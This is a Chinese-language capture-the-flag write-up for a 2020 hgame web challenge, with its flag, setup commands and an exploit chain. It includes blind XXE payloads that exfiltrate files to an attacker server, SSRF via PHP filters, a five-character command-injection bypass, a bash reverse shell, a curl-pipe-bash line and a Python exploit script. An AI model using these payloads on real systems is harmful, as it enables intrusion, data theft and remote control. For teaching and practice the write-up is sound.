## 考点
`PHP BlindXXE` `SSRF` `PHP伪协议` `命令执行绕过`

## flag
`hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}`

## 环境搭建
```bash
docker network create --subnet=172.21.0.0/24 docker-br0
docker-compose up -d
```
## WriteUp
### 0x00 BlindXXE

抓包 发现站点通过XML与后端交换数据，因此考虑xxe漏洞。并且发现无回显，则考虑BlindXXE.
payload:

```xml-dtd
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx/xxe.dtd">%remote;%int;%trick;]>
```
vps上:
```xml-dtd
<!ENTITY % payl SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/hosts'>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxx.xxx.xxx.xxx:5555/?p=%payl;'>">
```
vps上监听5555端口，可得读到的文件内容。

### 0x01 SSRF

读取`/etc/hosts`发现存在内网站点`http://172.20.0.76`
因此设法访问内网站点,这里有一个tips:

> 当使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错无法得到文件内容，因此需要使用 php过滤器的一个压缩的方法zlib.deflate

```xml-dtd
<!ENTITY % payl SYSTEM 'php://filter/zlib.deflate/convert.base64-encode/resource=http://172.20.0.76/'>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxx.xxx.xxx.xxx:5555/?p=%payl;'>">
```

解压: 

```http
php://filter/read=convert.base64-decode/zlib.inflate/resource=
```

得到内网站点内容。

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

$sandbox = '/var/www/html/sandbox/'. md5("hgame2020" . $_SERVER['REMOTE_ADDR']);;
@mkdir($sandbox);
@chdir($sandbox);

$content = @$_GET['v'];
if (isset($content)) {
    $cmd = substr($content,0,5);
    system($cmd);
}else if (isset($_GET['r'])) {
    system('rm -rf ./*');
}

/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
 | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
 |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
                                    |/

*/ 
```

可以发现，代码中截取了我们传入的字符串`$content`的前五个字符，传给`system`函数执行命令，但我们读取flag超过五个字符，因此需要想办法绕过。

### 0x02 命令执行绕过

在linux中，一条命令可以通过符号`\`分割为多行不影响执行结果。如

```bash
annevi@ubuntu:~# cat test
ec\
ho \
hello!
annevi@ubuntu:~# sh test
hello!
```

因此我们可以利用这个特性，将超长的命令分割为多段来执行。

为了让服务器记住我们先前所输入的命令片段，我们可以利用重定向符`>` `>>`来在当前目录创建文件。

文件名即为我们所需的命令片段。

为了让创建的文件按照我们想要的顺序排列，可以使用`ls -t`使得文件按照创建时间先后排序。

而`ls -t>a`超长度限制，因此我们需要用`ls>_`来构造出`ls -t>a`

如下:

```bash
>ls\\
ls>_
>\ \\
>-t\\
>\>a
ls>>_
```

由于没有说flag在哪，因此需要反弹shell方便找flag的位置。

使用简单的bash反弹：

```bash
bash -i >& /dev/tcp/0.0.0.0/2333 0>&1
```

该语句用上述方法构造比较麻烦，因此可将上述语句放在服务器(0.0.0.0)上再通过:

```bash
curl 0.0.0.0|bash
```

即可成功反弹shell。

### 0x03 exp

```python
import requests
import urllib.parse
import time

url_vps = "http://xxx.xxx.xx.xxx"
url_chal = "http://bdctr.hgame.day-day.work/submit.php"
url_lan = "http://172.21.0.76/?token=xxxx&v={}"
url_rm = "http://172.21.0.76/?token=xxxx&r"
url_lan_t = ''
payload_vps = """<!ENTITY % payl SYSTEM 'php://filter/zlib.deflate/convert.base64-encode/resource={}'>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxx.xxx.xxx.xxx/?p=%payl;'>">
"""
payload_a = '<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx/xxe.dtd">%remote;%int;%trick;]>'

def attack(payload_vps,payload):
    url_lan_t = url_lan.format(urllib.parse.quote(payload))
    data = {'a':payload_vps.format(url_lan_t)}
    print(data)
    requests.post(url_vps,data=data)
    time.sleep(0.5)
    requests.post(url_chal,data=payload_a)

def rm():
    data = {'a':payload_vps.format(url_rm)}
    requests.post(url_vps,data=data)
    time.sleep(0.5)
    requests.post(url_chal,data=payload_a)

rm()

# 将ls -t 写入文件_
cmd_list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>a",
    "ls>>_"
]

# curl 0.0.0.0|bash
cmd_list2=[
    ">bash",
    ">\|\\",
    ">0\\",
    ">0.\\",
    ">0.\\",
    ">0.\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]

for i in cmd_list:
    attack(payload_vps,str(i))
    time.sleep(1)

for i in cmd_list2:
    attack(payload_vps,str(i))
    time.sleep(1)

attack(payload_vps,"sh _")
time.sleep(1)
attack(payload_vps,"sh a")
```



